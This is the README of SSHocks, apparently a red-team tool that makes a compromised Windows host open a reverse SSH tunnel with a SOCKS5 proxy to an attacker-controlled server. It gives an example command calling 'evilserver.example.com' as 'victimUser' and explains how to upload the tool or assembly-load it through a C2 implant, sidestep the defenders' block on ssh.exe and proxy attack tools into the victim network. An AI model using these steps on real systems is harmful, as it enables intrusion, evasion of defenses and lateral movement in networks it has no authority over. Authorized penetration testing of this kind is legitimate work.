<h1>SSHocks v.1.0.0</h1>
                                       
SSHocks was born out of a penetration testing need. On a Red Team engagement, we needed to get a Socks5 proxy up and fast. We originally had one working through an SSH tunnel using OpenSSH natively installed on a Windows 10 target. However, partway through our engagement, the client placed protections that stopped ssh.exe from functioning. I got to work and cobbled together this simple SSH client with full Socks5 support. I wanted it to be a single executable file so it was easy to upload. It's built targeting .NET Framework 4.5.2. To get a single file for upload or Assembly Load in your implant, you'll have to use ILMerge to combine the executable and the 2 DLL files that are generated at compile.

-Example: *ILMerge.exe /out:SSHocks_merged.exe SSHocks.exe Renci.SshNet.dll CommandLine.dll*

The latest release is confirmed to work on Windows 10 hosts. It has not yet been tested on other versions of Windows. (I just built it! Give me time man!) If you've tried it on something other than Windows 10, please let me know!

**USAGE:** SSHocks.exe -s [SSH server] -p [SSH Port] -u [username] -k [Base64 encoded private key] -r [remote socks port] -l [local socks port]

(Ex. SSHocks.exe -s evilserver.example.com -p 2222 -u victimUser -k <Base64 Blob> -r 1080 -l 1080)

**NOTES:**

1. You will need to create the user account on your SSH server. Then, generate a keypair on your SSH server for your victim's user account. **DO NOT SET A PASSWORD ON THE KEY.** SSHocks supports ed_25519 keys only.

2. a) Upload SSHocks.exe to the victim host using your C2 agent or whatever other means you might have for uploading sketchy stuff.
   b) Assembly Load SSHocks.exe using your implants Assembly Load feature.

3. If uploaded, execute using your prefered binary execution method.
   
4. Once the client is connected to your attack SSH server and you've verified the proxy port is listening, you can use any proxy aware program or tool to attack the victim's network. Use Proxychains with non-proxy aware tools. Just make sure your proxychains.conf file is properly configured for the correct port and is using socks5.

7. **SHUT DOWN** Since the point was to use this via a C2 impant which is likely to not provide an interactive shell, I baked in a way to gracefully shut the proxy and tunnel down using a remote proxy command. Simply use proxychains or some other means to send:
  
   *curl xxx.xxx*
   
The proxy will receive the connection request and interpret it as a command to shutdown, and will disconnect gracefully.

<h2>To Do:</h2>
- Add option to hardcode private key in the source before compiling
